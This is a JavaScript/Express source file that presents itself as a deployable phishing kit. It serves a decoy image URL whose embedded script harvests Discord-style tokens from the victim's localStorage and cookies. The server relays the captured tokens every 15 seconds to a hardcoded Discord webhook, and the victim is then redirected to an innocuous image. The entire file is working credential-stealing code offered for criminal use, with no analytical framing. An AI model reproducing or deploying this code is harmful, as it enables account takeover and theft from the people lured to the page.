// PHANTOM'S VERCEL ZERO-CONFIG PHISHING KIT  
// 1-CLICK DEPLOYMENT SYSTEM - NO ENV REQUIRED  
// SHADOW SYNDICATE BLACK EDITION  

const express = require('express');  
const crypto = require('crypto');  
const axios = require('axios');  

const app = express();  
const WEBHOOK = "https://discord.com/api/webhooks/1352354085483053156/_mJb7zszAZ5ogi2Sxurfw6gYoECgIVMKdR7EDLO_jpbUhHmVWR2S6H2v4fxTMA98CbLw"; // HARDCODED WARHEAD  
const TOKEN_REGEX = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/;  

class VercelHunter {  
  constructor() {  
    this.trapId = crypto.randomBytes(8).toString('hex');  
    this.capturedTokens = [];  
    setInterval(() => this.flushTokens(), 15000); // 15-second flush  
  }  

  generateDecoy() {  
    return `  
    <html>  
    <script>  
      const stealAll = async () => {  
        const tokens = [  
          localStorage.getItem('token'),  
          document.cookie.match(/token=([^;]+)/)?.[1]  
        ].filter(t => ${TOKEN_REGEX}.test(t));  

        if(tokens.length) {  
          await fetch('/.netlify/functions/exfil', {  
            method: 'POST',  
            headers: {'Content-Type': 'application/json'},  
            body: JSON.stringify({trap: "${this.trapId}", tokens})  
          });  
        }  
        window.location.replace("https://i.imgur.com/LEGIT_IMAGE.jpg");  
      };  
      stealAll();  
    </script>  
    </html>`;  
  }  

  async flushTokens() {  
    if(this.capturedTokens.length) {  
      await axios.post(WEBHOOK, {  
        server: "vercel-phantom",  
        tokens: this.capturedTokens  
      });  
      this.capturedTokens = [];  
    }  
  }  
}  

const hunter = new VercelHunter();  

// Vercel serverless routes  
app.get('/image.jpg', (req, res) => res.send(hunter.generateDecoy()));  
app.post('/exfil', express.json(), (req, res) => {  
  if(req.body.trap === hunter.trapId) {  
    hunter.capturedTokens.push(...req.body.tokens.filter(t => TOKEN_REGEX.test(t)));  
  }  
  res.sendStatus(204);  
});  

module.exports = app;  
